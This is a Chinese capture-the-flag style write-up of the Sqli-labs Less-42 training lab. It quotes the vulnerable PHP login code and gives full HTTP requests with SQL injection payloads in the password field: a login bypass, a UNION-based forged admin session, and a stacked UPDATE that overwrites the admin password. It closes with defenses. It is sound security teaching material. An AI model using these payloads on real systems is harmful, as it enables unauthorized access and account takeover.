## 题目: Sqli‑labs Less‑42

## 题目描述
登录表单POST提交，`login_user`转义，**login_password密码位未过滤**，使用`mysqli_multi_query()`支持堆叠注入。

## 核心原理
```php
$username = mysqli_real_escape_string($con1, $_POST["login_user"]);
$password = $_POST["login_password"];
$sql = "SELECT * FROM users WHERE username='$username' and password='$password'";
```
注入点：`login_password`，单引号闭合，`';`执行多条 SQL；查询第 2 列写入 Session，可伪造登录身份。

**解题思路**
1. Burp 抓包修改 password 参数，实现登录绕过
2. Union 伪造 admin 会话
3. 堆叠 update 修改 admin 密码接管账号

## 解题步骤
### 1. 登录绕过 Burp 包
```
POST /sqli-labs/Less-42/login.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

login_user=admin&login_password=' or 1=1 -- -&mysubmit=Login
```
返回 Dumb 用户登录。

### 2. Union 伪造 admin 身份 Burp 包
```
POST /sqli-labs/Less-42/login.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

login_user=admin&login_password=' union select 1,'admin',3 -- -&mysubmit=Login
```
Session 用户名变为 admin。

### 3. 堆叠修改 admin 密码 Burp 包
```
POST /sqli-labs/Less-42/login.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

login_user=admin&login_password='; update users set password='pwned42' where username='admin' -- -&mysubmit=Login
```

页面无回显，密码已修改。

### 4. 验证登录
```
POST /sqli-labs/Less-42/login.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

login_user=admin&login_password=pwned42&mysubmit=Login
```
使用新密码成功登录 admin。

## 踩坑记录
1. 注入点是密码位，用户名做了转义无法注入。
2. Burp Repeater 自动编码 payload，无需手动写`+`。
3. 堆叠写操作无页面回显，依靠业务行为验证。
4. users 共 3 列，Union 必须匹配列数。

## 知识点总结
- POST 登录框注入，参数过滤不全导致漏洞。
- `mysqli_multi_query()`堆叠注入，`';`执行多条 SQL。
- Union 可伪造 Session 登录身份；堆叠 update 直接覆盖密码接管账号。
- 防御：预编译参数绑定，关闭多语句查询，所有输入统一过滤。
